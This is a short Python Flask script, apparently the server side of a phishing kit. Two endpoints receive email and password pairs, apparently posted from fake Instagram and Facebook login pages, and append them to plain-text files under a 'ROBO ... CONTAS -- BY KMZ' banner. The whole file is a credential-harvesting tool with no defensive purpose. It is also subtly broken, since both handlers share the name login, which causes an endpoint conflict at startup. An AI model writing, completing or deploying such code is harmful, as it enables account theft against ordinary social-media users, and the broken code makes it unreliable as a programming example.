from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Habilita CORS para todas as rotas

@app.route('/login', methods=['POST'])
def login():
    if request.method == 'POST':
        data = request.json
        email = data.get('email')
        senha = data.get('senha')
        
        try:
            with open('instagram.txt', 'a') as file:
                file.write('[ ROBO INSTAGRAM CONTAS -- BY KMZ ]\n')
                file.write(f'email: {email}\n')
                file.write(f'senha: {senha}\n\n')
            return jsonify({"success": True}), 200
        except Exception as e:
            return jsonify({"success": False, "error": str(e)}), 500
        

@app.route('/loginface', methods=['POST'])
def login():
    if request.method == 'POST':
        data = request.json
        email = data.get('email')
        senha = data.get('senha')
        
        try:
            with open('facebook.txt', 'a') as file:
                file.write('[ ROBO FACEBOOK CONTAS -- BY KMZ ]\n')
                file.write(f'email: {email}\n')
                file.write(f'senha: {senha}\n\n')
            return jsonify({"success": True}), 200
        except Exception as e:
            return jsonify({"success": False, "error": str(e)}), 500
        



if __name__ == '__main__':
    app.run(debug=True)
